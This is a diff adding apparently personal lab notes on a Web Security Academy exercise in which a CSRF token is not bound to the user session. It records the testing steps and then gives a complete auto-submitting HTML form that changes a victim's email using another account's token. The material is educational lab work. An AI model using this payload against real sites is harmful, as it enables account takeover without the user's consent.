@@ -71,6 +71,61 @@ Exploit:
 </script>
 ```
 
+**CSRF where token is not tied to user session**
+
+Cant changed email when removing csrf token
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/7f8f8bc7-fb21-49e1-98a5-c9e787f3e597)
+
+Cant change to get request either to change email
+See if csrf token is tied to user session
+Check by logging into another user account and copying there csrf token 
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/b26f4b63-6f22-490f-aee2-e96c485aae5c)
+
+ 
+
+
+
+Replacing the csrf parmeter we get a 302 response 
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/16b7e052-d04d-40c3-a6b2-b7a3357a4789)
+
+
+
+CSRF token is used every time we changed an account so if we want to change another one we need another csrf token 
+Our exploit:
+```
+<html>
+    <body>
+    <script> history.pushState(' ',' ', '/')</script>
+    <form action="https://0a08004803a6fb1a8040b860005c004f.web-security-academy.net/my-account/change-email" method="POST">
+        <input type="hidden" name="email" value="vffasf@gmail.com"/>
+        <input type="hidden" name="csrf"  value="aIOCt2aXj52tiS7BFW5EVCy8k7UG8siS" />
+        <input type="submit" value="submit request"/>
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+    </body>
+</html>
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
